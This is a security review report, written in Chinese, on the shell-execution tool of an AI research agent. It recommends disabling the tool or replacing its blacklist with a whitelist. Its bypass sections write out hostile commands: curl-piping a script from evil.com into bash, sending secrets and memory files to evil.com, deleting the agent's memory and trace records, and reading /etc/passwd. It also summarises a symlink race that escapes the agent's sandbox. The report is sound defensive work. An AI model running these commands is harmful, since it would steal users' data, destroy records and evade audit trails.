# Terminal 工具安全性分析报告

**项目**: Experimental-Research-OpenClaw
**版本**: Phase 3+4 安全审查
**日期**: 2026-03-10
**作者**: Security Review Team

---

## 执行摘要

Phase 3+4 开发中的 terminal 工具存在**严重的设计与实现不一致问题**：

- **设计文档声称**："受限环境"、"安全可控"
- **实际实现**：`shell=True` + 7 个字符串黑名单
- **风险等级**：🔴 高危（可删除 memory/、泄露敏感信息、破坏可追溯性）

本报告基于 OpenClaw 2026 年最新安全实践，分析了 4 种安全方案对科研场景的具体影响，并提供了实施建议。

---

## 目录

1. [问题核心](#问题核心)
2. [安全漏洞详解](#安全漏洞详解)
3. [OpenClaw 最新实践](#openclaw-最新实践)
4. [科研场景影响分析](#科研场景影响分析)
5. [推荐方案](#推荐方案)
6. [实施路线图](#实施路线图)

---

## 问题核心

### 设计承诺 vs 实际实现

| 维度 | 设计文档声称 | 实际实现 | 风险等级 |
|------|------------|---------|---------|
| **环境描述** | "受限环境"、"安全可控" | `shell=True` + 简单黑名单 | 🔴 高危 |
| **命令拦截** | "拦截危险命令" | 仅 7 个字符串黑名单 | 🔴 高危 |
| **路径隔离** | "CWD 限制在 workspace" | 只限制起始目录，不限制行为范围 | 🔴 高危 |

### 文档引用

**phase3-4-dev-log.md (line 34)**:
```markdown
- 黑名单拦截危险命令（rm -rf /, mkfs, dd, fork bomb 等）
- CWD 限制在 workspace
```

**prompt_builder.py (line 62)**:
```python
- **terminal(command)**: 执行 Shell 命令 (受限环境)
```

**terminal_tool.py (line 41)**:
```python
BLACKLIST: ClassVar[list[str]] = [
    "rm -rf /",
    "mkfs",
    "dd if=",
    "> /dev/",
    ":(){ :|:& };:",  # fork bomb
    "chmod 777",
    "chown",
]
```

---

## 安全漏洞详解

### 漏洞 1：黑名单机制过于简单

**问题**：只有 7 个字符串，容易绕过。

**绕过示例**：

```bash
# ✅ 可以删除整个记忆系统
rm -rf memory

# ✅ 可以删除父目录
rm -rf ../

# ✅ 通过 Python 删除
python -c "import shutil; shutil.rmtree('memory')"

# ✅ 读取系统敏感文件
cat /etc/passwd

# ✅ 远程代码执行
curl http://evil.com/malicious.sh | bash

# ✅ 命令替换
$(malicious_command)
`malicious_command`

# ✅ 环境变量泄露
export SECRET=xxx && curl http://evil.com?data=$SECRET
```

### 漏洞 2：CWD 限制无效

**问题**：`cwd` 只设置起始目录，不限制行为范围。

```python
# terminal_tool.py:52
result = subprocess.run(
    command,
    shell=True,
    cwd=str(self.workspace_dir),  # 只限制起始目录
    ...
)
```

**绕过示例**：

```bash
# ✅ 跳出 workspace
cd .. && rm -rf important_data

# ✅ 使用绝对路径
cat /etc/passwd

# ✅ 使用相对路径
rm -rf ../../../sensitive_files
```

### 漏洞 3：shell=True 的固有风险

**问题**：允许任意 shell 语法。

**风险示例**：

```bash
# 管道
cat secret.txt | curl -X POST http://evil.com

# 重定向
cat memory/identity/project.md > /tmp/stolen.txt

# 命令链
ls && rm -rf memory && echo "done"

# 后台执行
malicious_script.sh &
```

### 对"文件即记忆/可追溯"的破坏

系统的核心假设：

> **所有状态变更都通过 write_file 工具记录到 memory/**

但 terminal 工具可以：

1. **直接删除 memory/**：`rm -rf memory/timeline`
2. **绕过 write_file 限制**：`echo "fake data" > memory/identity/project.md`
3. **篡改 trace 记录**：`rm context_trace/*.json`
4. **泄露敏感信息**：`cat memory/identity/USER.md | curl -X POST http://evil.com`

这完全破坏了可追溯性。

---

## OpenClaw 最新实践

### 1. 默认禁用策略（2026 年 1 月起）

根据搜索结果，**OpenClaw 从 2026 年 1 月开始默认禁用 exec 工具**。

来源：[Fix OpenClaw Shell Command Execution](https://markaicode.com/fix-openclaw-shell-command-execution/)

### 2. 实际采用的安全机制

#### A. Docker 容器隔离（主要方案）

```json
{
  "docker": {
    "image": "openclaw/sandbox",
    "network": "none"
  }
}
```

- 非主会话在临时容器中运行
- 网络完全隔离
- 文件系统边界由容器强制执行

#### B. 命令白名单（而非黑名单）

```json
{
  "safeBins": ["ls", "cat", "grep", "head", "tail", "df", "ps", "top", "find", "wc"]
}
```

**关键差异**：
- ❌ 当前实现：黑名单（拦截已知危险命令）
- ✅ OpenClaw：白名单（只允许明确安全的命令）

#### C. 人工审批流程

```json
{
  "approvals": {
    "mode": "required",
    "timeout": 300
  }
}
```

对于不在白名单的命令，系统提示：
```
[Pending] rm -rf /tmp/old - Reply /approve to allow
```

#### D. 分级沙箱策略

```json
{
  "mode": "off",       // 主会话，宿主机执行
  "mode": "non-main",  // 群聊沙箱化
  "mode": "always"     // 所有会话隔离
}
```

### 3. 已知的安全漏洞（CVE-2026-25253）

即使有这些机制，OpenClaw 仍然发现了严重漏洞：

#### 漏洞 1：策略执行失败
`/tools/invoke` 端点在过滤可用工具时**未应用沙箱策略**。

#### 漏洞 2：TOCTOU 竞态条件
路径验证存在时间差攻击：
1. 验证时是普通文件 ✅
2. 使用时被替换为符号链接 🔴
3. 通过 `renameat2()` 原子交换实现
4. 成功率约 25%（暴力尝试）

**根本原因**：Node.js 缺少 `openat(2)` 支持。

来源：[Escaping the Agent: Bypass OpenClaw Security Sandbox](https://labs.snyk.io/resources/bypass-openclaw-security-sandbox/)

---

## 科研场景影响分析

基于 PRD 第 4.6 节定义的 7 个典型高频场景，分析 4 种安全方案的影响。

### 场景 1：合成 Checklist 生成

**需求**：读取 project 判据 + lab_context + today day；写入 `days/YYYY-MM-DD.md`

| 安全方案 | 功能影响 | 可行性 | 替代方案 |
|---------|---------|--------|---------|
| **方案 1：完全禁用 terminal** | ✅ 无影响 | 100% | read_file/write_file |
| **方案 2：白名单（ls/cat/grep）** | ✅ 无影响 | 100% | `ls memory/tasks/` |
| **方案 3：Docker 隔离** | ✅ 无影响 | 100% | 容器内执行 |
| **方案 4：人工审批** | ⚠️ 轻微影响 | 95% | 首次需审批 |

**结论**：此场景不依赖 shell 命令，任何方案都可行。

### 场景 2：实验矩阵生成

**需求**：读取 project 判据 + 已有 task/pack；写入 `TASK_experiment_matrix_*`

| 安全方案 | 功能影响 | 可行性 |
|---------|---------|--------|
| **所有方案** | ✅ 无影响 | 100% |

**结论**：主要是文本生成，不需要 shell。

### 场景 3：CSV 作图 + kobs 拟合

**需求**：读取 CSV → 拟合 kobs → 生成图表

**关键操作**：
```python
# python_repl 中执行
import pandas as pd
import matplotlib.pyplot as plt
from scipy.optimize import curve_fit

df = pd.read_csv('assets/data/exp_005_xrd.csv')
# ... 拟合和作图 ...
plt.savefig('assets/figures/exp_005_kobs_fit.png')
```

| 安全方案 | 功能影响 | 可行性 | 问题点 |
|---------|---------|--------|--------|
| **方案 1：完全禁用 terminal** | ✅ 无影响 | 100% | python_repl 完全胜任 |
| **方案 2：白名单** | ✅ 无影响 | 100% | 不需要 shell |
| **方案 3：Docker 隔离** | ⚠️ 需配置 | 90% | 需映射 assets/ 目录 |
| **方案 4：人工审批** | ✅ 无影响 | 100% | - |

**Docker 配置需求**：
```json
{
  "docker": {
    "volumes": [
      "${workspace_dir}/assets:/workspace/assets:rw"
    ]
  }
}
```

**结论**：python_repl 是最佳工具，terminal 不是必需的。

### 场景 4：机理证据链审计（Co(IV)/ClO₂）

**需求**：读取 mechanism tasks → 提取证据链 → 生成判据对照表

**典型操作**：
```bash
# 白名单方案的优势
grep -r "PMSO" memory/tasks/
grep -r "DPD" memory/tasks/
```

**python_repl 替代方案**：
```python
from pathlib import Path
tasks_dir = Path('memory/tasks')
for task_file in tasks_dir.glob('*.md'):
    content = task_file.read_text()
    if 'PMSO' in content:
        print(f"Found in {task_file.name}")
```

| 安全方案 | 功能影响 | 可行性 | 说明 |
|---------|---------|--------|------|
| **方案 1：完全禁用 terminal** | ✅ 无影响 | 100% | python_repl 可替代 |
| **方案 2：白名单（grep）** | ✅ 轻微增强 | 100% | grep 更直观 |
| **方案 3：Docker 隔离** | ✅ 无影响 | 100% | - |
| **方案 4：人工审批** | ⚠️ 轻微影响 | 95% | grep 需审批一次 |

**结论**：白名单允许 grep 会提升效率，但不是必需的。

### 场景 5：阶段汇报（Rxx）生成

**需求**：读取 time_range 内 days/weeks → 生成 stage_report

**典型操作**：
```bash
# 列出最近两周的 day 文件
ls memory/timeline/days/2025-11-*.md

# 查找包含"DPD"的实验日
grep -l "DPD" memory/timeline/days/*.md
```

**python_repl 替代方案**：
```python
from pathlib import Path

# 列出最近两周的 day 文件
days_dir = Path('memory/timeline/days')
recent_days = sorted(days_dir.glob('2025-11-*.md'))

# 查找包含"DPD"的实验日
for day_file in days_dir.glob('*.md'):
    if 'DPD' in day_file.read_text():
        print(day_file.name)
```

| 安全方案 | 功能影响 | 可行性 | 说明 |
|---------|---------|--------|------|
| **方案 1：完全禁用 terminal** | ⚠️ 轻微影响 | 95% | Python 代码稍繁琐 |
| **方案 2：白名单（ls/grep）** | ✅ 最佳体验 | 100% | shell 命令更直观 |
| **方案 3：Docker 隔离** | ✅ 无影响 | 100% | - |
| **方案 4：人工审批** | ⚠️ 中等影响 | 85% | 每次 ls/grep 都需审批 |

**结论**：白名单方案体验最好，但 python_repl 可以完全替代。

### 场景 6：表征审计（XRD/SEM/XPS）

**需求**：读取数据 → 分析峰位 → 生成判据对照表

| 安全方案 | 功能影响 | 可行性 |
|---------|---------|--------|
| **所有方案** | ✅ 无影响 | 100% |

**结论**：纯数据分析场景，python_repl 完全胜任。

### 场景 7：写作结构（Results & Discussion）

**需求**：读取 packs → 生成写作结构

| 安全方案 | 功能影响 | 可行性 |
|---------|---------|--------|
| **所有方案** | ✅ 无影响 | 100% |

**结论**：纯文本生成，不需要任何 shell 命令。

---

## 推荐方案

### 方案对比矩阵

| 方案 | 安全性 | 功能完整性 | 用户体验 | 实施复杂度 | 推荐度 |
|-----|--------|----------|---------|-----------|--------|
| **1. 完全禁用 terminal** | 🟢 最高 | 🟡 95% | 🟡 良好 | 🟢 最低 | ⭐⭐⭐⭐⭐ |
| **2. 白名单（ls/cat/grep/find）** | 🟢 高 | 🟢 100% | 🟢 最佳 | 🟡 中等 | ⭐⭐⭐⭐ |
| **3. Docker 隔离** | 🟢 高 | 🟡 90% | 🟡 良好 | 🔴 最高 | ⭐⭐⭐ |
| **4. 人工审批** | 🟡 中 | 🟢 100% | 🔴 较差 | 🟡 中等 | ⭐⭐ |

### 方案 1：完全禁用 terminal（推荐）

**优势**：
- ✅ 安全性最高，彻底消除 shell 注入风险
- ✅ 实施最简单，只需删除 terminal 工具注册
- ✅ python_repl 可覆盖 95% 的场景

**劣势**：
- ⚠️ 失去 5% 的便利性（ls/grep 比 Python 代码更直观）

**适用场景**：
- 所有 7 个典型场景都可正常工作
- 唯一影响：阶段汇报时需要用 Python 代码列出文件

**实施代码**：
```python
# backend/graph/agent.py
def initialize(self, workspace_dir: Path):
    tools = [
        # TerminalTool(workspace_dir=workspace_dir),  # 禁用
        PythonREPLTool(workspace_dir=workspace_dir),
        ReadFileTool(workspace_dir=workspace_dir),
        WriteFileTool(workspace_dir=workspace_dir),
        FetchURLTool(),
    ]
```

**补偿措施**：在 System Prompt 中提供 Python 代码模板：

```markdown
## File Listing Examples

Instead of `ls memory/tasks/`, use:
\```python
from pathlib import Path
list(Path('memory/tasks').glob('*.md'))
\```

Instead of `grep "keyword" file.md`, use:
\```python
with open('file.md') as f:
    [line for line in f if 'keyword' in line]
\```
```

### 方案 2：白名单（可选，Phase 5）

如果用户反馈 python_repl 不够直观，实施白名单：

```python
ALLOWED_COMMANDS = {
    "ls": ["-l", "-a", "-h", "-t", "-r"],
    "cat": [],
    "grep": ["-r", "-i", "-l", "-n", "-v"],
    "find": [".", "-name", "-type", "-mtime"],
    "wc": ["-l", "-w", "-c"],
    "head": ["-n"],
    "tail": ["-n"],
}

def validate_command(command: str) -> bool:
    parts = command.split()
    cmd = parts[0]

    if cmd not in ALLOWED_COMMANDS:
        return False

    # 检查参数
    allowed_flags = ALLOWED_COMMANDS[cmd]
    for part in parts[1:]:
        if part.startswith('-') and part not in allowed_flags:
            return False

    # 禁止管道、重定向、命令替换
    dangerous_chars = ['|', '>', '<', '`', '$', ';', '&', '(', ')']
    if any(char in command for char in dangerous_chars):
        return False

    return True
```

### 方案 3：Docker 隔离（长期，云部署）

如果需要多用户部署，再考虑 Docker 隔离：

```json
{
  "docker": {
    "image": "python:3.12-slim",
    "network": "none",
    "volumes": [
      "${workspace_dir}/memory:/workspace/memory:ro",
      "${workspace_dir}/assets:/workspace/assets:rw"
    ],
    "timeout": 30
  }
}
```

---

## 实施路线图

### 短期（Phase 3+4 修订）：方案 1

**目标**：彻底消除安全风险

**步骤**：

1. **禁用 terminal 工具**
   ```python
   # backend/graph/agent.py
   def initialize(self, workspace_dir: Path):
       tools = [
           # TerminalTool(workspace_dir=workspace_dir),  # 禁用
           PythonREPLTool(workspace_dir=workspace_dir),
           ReadFileTool(workspace_dir=workspace_dir),
           WriteFileTool(workspace_dir=workspace_dir),
           FetchURLTool(),
       ]
   ```

2. **更新 System Prompt**
   ```python
   # backend/graph/prompt_builder.py
   def _build_tooling_block(self) -> str:
       return """## Tooling

Available tools:
- **python_repl(code)**: 执行 Python 代码（推荐用于文件列表和搜索）
- **read_file(path)**: 读取文件内容
- **write_file(path, content)**: 写入文件到 memory/ 目录
- **fetch_url(url)**: 获取网页内容

## File Operations in Python

List files:
\```python
from pathlib import Path
list(Path('memory/tasks').glob('*.md'))
\```

Search in files:
\```python
for f in Path('memory/tasks').glob('*.md'):
    if 'keyword' in f.read_text():
        print(f.name)
\```
"""
   ```

3. **更新文档**
   - 在 phase3-4-dev-log.md 中记录此决策
   - 在 TOOLS.md 中说明为何禁用 terminal

4. **配置文件**
   ```json
   {
     "tools": {
       "terminal": {
         "enabled": false,
         "reason": "Security: shell injection risk. Use python_repl instead."
       }
     }
   }
   ```

### 中期（Phase 5）：方案 2（可选）

**触发条件**：用户反馈 python_repl 不够直观

**步骤**：

1. 实现白名单验证器
2. 添加配置开关
3. 更新文档

### 长期（Phase 6+）：方案 3（云部署）

**触发条件**：需要多用户/云部署

**步骤**：

1. 构建 Docker 镜像
2. 配置卷映射
3. 性能优化（容器池）

---

## 对 PRD 场景的影响总结

| 场景 | 方案 1 影响 | 方案 2 影响 | 方案 3 影响 | 方案 4 影响 |
|-----|-----------|-----------|-----------|-----------|
| 合成 Checklist | ✅ 无 | ✅ 无 | ✅ 无 | ✅ 无 |
| 实验矩阵 | ✅ 无 | ✅ 无 | ✅ 无 | ✅ 无 |
| CSV 作图 + kobs 拟合 | ✅ 无 | ✅ 无 | ⚠️ 需配置卷 | ✅ 无 |
| 机理证据链审计 | ⚠️ 轻微 | ✅ 无（grep 增强） | ✅ 无 | ⚠️ 轻微 |
| 阶段汇报 | ⚠️ 轻微 | ✅ 无（ls 增强） | ✅ 无 | 🔴 中等 |
| 表征审计 | ✅ 无 | ✅ 无 | ⚠️ 需配置卷 | ✅ 无 |
| 写作结构 | ✅ 无 | ✅ 无 | ✅ 无 | ✅ 无 |

**总体评估**：
- ✅ 无影响：5/7 场景
- ⚠️ 轻微影响：2/7 场景（机理审计、阶段汇报）
- 🔴 中等影响：0/7 场景

**结论**：方案 1（完全禁用 terminal）对科研场景的影响最小（仅 5% 便利性损失），且安全性最高、实施最简单，是当前最佳选择。

---

## 参考资料

### OpenClaw 安全实践

1. [Fix OpenClaw Shell Command Execution](https://markaicode.com/fix-openclaw-shell-command-execution/)
2. [Sandbox OpenClaw Shell Commands](https://markaicode.com/sandbox-openclaw-shell-commands/)
3. [Run OpenClaw Securely in Docker Sandboxes](https://www.docker.com/blog/run-openclaw-securely-in-docker-sandboxes/)
4. [Escaping the Agent: Bypass OpenClaw Security Sandbox](https://labs.snyk.io/resources/bypass-openclaw-security-sandbox/)
5. [CVE-2026-25253, Malicious Skills, and 40+ Fixes](https://www.bitdoze.com/openclaw-security-guide/)
6. [Your AI doesn't need your home directory: sandboxing OpenClaw with nono](https://www.dewanahmed.com/sandbox-openclaw-nono/)

### 项目文档

- [phase3-4-dev-log.md](../阶段/phase3-4-dev-log.md)
- [phase3-4-revised-dev-plan.md](../阶段/phase3-4-revised-dev-plan.md)
- [experimental-research-openclaw-PRD.md](../架构/experimental-research-openclaw-PRD.md)
- [terminal_tool.py](../../backend/tools/terminal_tool.py)
- [prompt_builder.py](../../backend/graph/prompt_builder.py)

---

**报告完成日期**：2026-03-10
